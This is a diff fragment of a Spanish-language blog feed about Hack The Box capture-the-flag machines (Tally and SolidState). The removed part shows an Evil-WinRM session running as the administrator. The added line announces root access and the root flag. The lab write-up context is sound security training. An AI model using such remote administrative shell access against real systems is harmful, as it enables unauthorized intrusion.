-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;tally&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somo el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="SQL" /><category term="C" /><category term="Patch Management" /><summary type="html">Resolución de la máquina Tally en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somo el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina SolidState en la plataforma de Hack The Box</summary></entry></feed>
